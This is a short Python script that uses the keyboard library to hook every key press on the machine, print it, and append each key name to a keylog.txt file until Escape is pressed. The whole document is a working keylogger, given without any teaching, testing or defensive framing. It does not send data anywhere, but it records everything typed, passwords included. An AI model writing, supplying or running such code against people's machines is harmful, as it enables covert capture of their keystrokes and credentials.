import os
import keyboard

def on_event(event):
    key = event.name
    print(f'Key {key} pressed')

    current_dir = os.path.dirname(os.path.abspath(__file__))
    keylog_path = os.path.join(current_dir, 'keylog.txt')

    with open(keylog_path, 'a', encoding='utf-8') as file:
        file.write(key + '\n')

keyboard.on_press(on_event)

keyboard.wait('esc')
